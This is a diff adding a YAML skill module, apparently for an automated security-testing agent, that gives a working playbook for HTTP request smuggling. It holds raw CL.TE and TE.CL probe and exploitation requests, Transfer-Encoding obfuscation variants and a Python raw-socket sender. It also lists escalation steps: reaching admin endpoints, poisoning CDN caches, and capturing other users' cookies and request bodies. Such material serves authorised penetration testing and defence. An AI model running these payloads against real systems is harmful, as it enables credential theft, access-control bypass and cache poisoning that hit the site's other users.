@@ -1,0 +1,129 @@
+id: request-smuggling
+name: "HTTP Request Smuggling"
+description: "CL.TE, TE.CL, TE.TE, and H2 downgrade smuggling detection and exploitation"
+version: 1
+applicable_roles: [attack, audit]
+tags: [request-smuggling, http, desync, cl-te, te-cl, h2, proxy, smuggling]
+triggers:
+  - "Transfer-Encoding"
+  - "CL\\.TE"
+  - "TE\\.CL"
+  - "TE\\.TE"
+  - "desync"
+  - "smuggl"
+  - "HAProxy"
+  - "Apache Traffic Server"
+  - "nginx/1\\.[0-9]\\."
+  - "front.?end.*back.?end"
+  - "reverse.proxy"
+  - "HTTP/2.*downgrade"
+  - "h2c"
+  - "keep-alive"
+estimated_tokens: 700
+content: |
+  ## HTTP Request Smuggling
+
+  ### Concept
+  Smuggling exploits disagreements between a front-end proxy and back-end server about where one HTTP request ends and the next begins. The attacker's "smuggled" suffix is treated as the start of the next request by the back-end.
+
+  ### Step 1: Timing-Based Detection (Safe First Step)
+  Send ambiguous requests and measure response timing. A vulnerable server stalls on the smuggled incomplete request.
+
+  **CL.TE probe** (front-end trusts Content-Length, back-end trusts Transfer-Encoding):
+  ```
+  POST / HTTP/1.1
+  Host: target
+  Content-Length: 4
+  Transfer-Encoding: chunked
+
+  1
+  A
+  X
+  ```
+  If the back-end hangs waiting for the next chunk, CL.TE is confirmed.
+
+  **TE.CL probe** (front-end trusts TE, back-end trusts CL):
+  ```
+  POST / HTTP/1.1
+  Host: target
+  Content-Length: 6
+  Transfer-Encoding: chunked
+
+  0
+
+  X
+  ```
+  If the back-end reads "X" as part of this request but the front-end already ended it, TE.CL is confirmed.
+
+  ### Step 2: Exploitation Payloads
+
+  **CL.TE — smuggle a prefix** (back-end sees SMUGGLED as start of next request):
+  ```
+  POST / HTTP/1.1
+  Host: target
+  Content-Length: 13
+  Transfer-Encoding: chunked
+
+  0
+
+  SMUGGLED
+  ```
+
+  **TE.CL — smuggle with chunked prefix**:
+  ```
+  POST / HTTP/1.1
+  Host: target
+  Content-Length: 4
+  Transfer-Encoding: chunked
+
+  5c
+  GPOST / HTTP/1.1
+  Host: target
+  Content-Length: 15
+
+  x=1
+  0
+
+  ```
+
+  **H2.CL downgrade** (front-end HTTP/2, back-end HTTP/1.1):
+  - Send HTTP/2 request with a `Content-Length` header that disagrees with the actual body length
+  - The front-end forwards via H1 to back-end; surplus bytes become the next request
+  - Also try `Transfer-Encoding: chunked` in H2 frames (should be illegal but some proxies forward it)
+
+  ### Step 3: TE Header Obfuscation (TE.TE Variant)
+  When both servers honor Transfer-Encoding, trick one into ignoring it:
+  - `Transfer-Encoding: xchunked`
+  - `Transfer-Encoding : chunked` (space before colon)
+  - `Transfer-Encoding:\x0bchunked` (vertical tab)
+  - `Transfer-encoding: chunked\r\nTransfer-encoding: x` (duplicate with second invalid)
+  - `TRANSFER-ENCODING: chunked` (case variation)
+  - `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity`
+
+  ### Step 4: Confirming Exploitability
+  - Smuggle a `GET /known-404-path` — if the next legitimate request returns that 404, confirmed.
+  - Smuggle `GET /admin HTTP/1.1\r\nHost: target\r\nX:` — admin content leaking to other users proves request boundary confusion.
+  - Smuggle a request that reflects headers — capture another user's cookies/auth tokens.
+
+  ### Step 5: Impact Escalation
+  - **Auth bypass**: smuggle requests to `/admin` or internal-only endpoints behind the proxy.
+  - **Cache poisoning**: smuggle a request whose response poisons the CDN cache for other users.
+  - **Credential theft**: smuggle a partial request so the next user's request body appends to yours.
+  - **Request routing bypass**: cross virtual-host boundaries by smuggling a different Host header.
+
+  ### Tooling
+  - **Python raw sockets** (when curl normalizes headers):
+    ```python
+    import socket
+    s = socket.socket(); s.connect((host, 80))
+    s.send(b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED")
+    print(s.recv(4096))
+    ```
+  - **smuggler.py** (defparam/smuggler): automated CL.TE/TE.CL/TE.TE detection.
+  - `curl --http1.1 --raw` for manual probe construction.
+  - Must use keep-alive connections — send two requests back-to-back on the same socket.
+
+  ### Gotchas
+  - Many CDNs (Cloudflare, Akamai) patched classic smuggling — focus on custom proxies (old HAProxy, nginx 1.x, Apache Traffic Server).
+  - HTTP/2 smuggling requires the proxy to downgrade to HTTP/1.1 for the back-end.
+  - Some servers reject requests with both CL and TE — that itself is a good sign (properly patched).
